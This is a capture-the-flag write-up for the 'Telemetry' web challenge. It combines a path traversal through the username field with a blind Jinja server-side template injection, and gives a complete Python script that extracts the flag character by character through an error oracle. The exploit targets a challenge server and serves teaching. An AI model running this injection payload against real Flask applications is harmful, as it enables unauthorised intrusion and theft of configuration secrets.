# Telemetry
Solves: 
Tags: #ssti #blind

## Description
> Elia has just developed a brand-new website to analyze logs at runtime 🧻. Confident in his security skills, he bet his entire house that you won't find the hidden flag... Will you prove him wrong? 🏠🔍
  
  Website: [http://telemetry.challs.ulisse.ovh:6969](http://telemetry.challs.ulisse.ovh:6969)

## Overview
It's a website that allows to upload files. Every action the user takes is logged in a log file.

## Road to flag
The flag is only loaded as env variable
```python
app.config['FLAG'] = os.getenv('FLAG')
```

## Code review
- Path traversal using the username
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['user']
    log_file = request.form['log']

    if len(log_file) != 32:
        flash('Invalid log filename length', 'danger')
        return redirect('/')
    
    user_id = str(uuid.UUID(log_file))
    log_file = user_id + '.txt' 
    
    if os.path.exists(os.path.join('logs', username, log_file)):
        flash('User/Log already exists', 'danger')
        return redirect('/')
    
    session['user'] = (user_id, username)
    session['files'] = MAX_FILES
    
    os.makedirs(os.path.join('logs', username), exist_ok=True)
    with open(os.path.join('logs', username, log_file), 'w') as f:
        f.write(f'[{time.time()}] - Log file: {user_id}.txt\n')
        f.write(f'[{time.time()}] - User logged in\n')
    
    return redirect('/upload')
```

- Blind SSTI
```python
@app.route('/check', methods=['GET', 'POST'])
def check():
    if request.method == 'GET':
        return render_template('check.html')
    
    template = secure_filename(request.form['template'])
    print(template)
    if not os.path.exists(os.path.join('templates', template)):
        flash('Template not found', 'danger')
        return redirect('/check')
    try:
        render_template(template)
        flash('Template rendered successfully', 'success')
    except Exception as e:
        print(e)
        flash('Error rendering template', 'danger')
    return redirect('/check')
```

## Exploitation
```python
import requests
import random
import string

#url = 'http://localhost:6969'
url = "http://telemetry.challs.ulisse.ovh:6969"

guess = "UlisseCTF{"
oracle = "Error rendering template"

charset = string.ascii_letters + string.digits + "_" + "{}!?"

def login(s, log):
    s.post(url + '/login', data={"user": f"../templates/", "log": log.replace("-", "").replace(".txt", "")})

def poison(s,guess):
    payload = "{{1/0 if config['FLAG'].startswith('"+guess+"') else ''}}"
    s.get(url + f"/{payload}")

def check(s, log):
    r = s.post(url + '/check', data={"template": log})
    return r.text

while True:
    for c in charset:
        p1 = ''.join(random.choices("abcdef" + string.digits, k=12))
        p2 = ''.join(random.choices("abcdef" + string.digits, k=8))
        p3 = ''.join(random.choices("abcdef" + string.digits, k=4))
        p4 = ''.join(random.choices("abcdef" + string.digits, k=4))
        log = f"{p2}-{p3}-{p3}-{p4}-{p1}.txt"

        s = requests.Session()

        login(s, log)
        poison(s, guess+c)
        if oracle in check(s, log):
            guess += c
            print("got: " + guess)
            break
    else:
        print("final: " + guess)
        break
```

`UlisseCTF{n3x7_T1m3_st1ck_t0_your_l0g5!}`
